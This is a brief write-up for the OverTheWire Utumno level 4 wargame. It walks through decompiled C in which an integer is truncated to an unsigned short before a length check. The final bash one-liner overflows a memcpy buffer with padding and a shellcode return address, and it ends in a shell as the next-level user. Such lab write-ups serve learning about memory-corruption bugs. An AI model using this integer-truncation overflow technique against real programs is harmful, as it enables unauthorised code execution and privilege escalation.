# Overthewire Utumno Level 4 Writeup

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int16 v4; // [sp+1Eh] [bp-FF02h]@3
  __int16 v5; // [sp+FF1Ah] [bp-6h]@1
  int v6; // [sp+FF1Ch] [bp-4h]@1

  v6 = atoi(argv[1]);
  v5 = v6;
  if ( (unsigned __int16)v6 > 0x3Fu )
    exit(1);
  memcpy(&v4, argv[2], v6);
  return 0;
}
```

The program converts signed integer to unsigned short and compares it with 0x3f. Below is a sample program:

```c
#include <stdio.h>

int main()
{
  int b = 65536;
  unsigned short a = b;
  printf("%u\n", a);
  return 0;
}
```

It outpus `0`. Converting larger size signed integer to smaller unsigned integer is equivalent to calculate mod 2^k of the larger one, k is length of the result type.
After trying some times to find the offset to saved eip, the final exploit:

```bash
$ ./utumno4 65536 `python -c 'print "A"*65294+"\xf9\xde\xff\xff"'` # 0xffffdef9 is the address of shellcode
$ whoami
utumno5
```
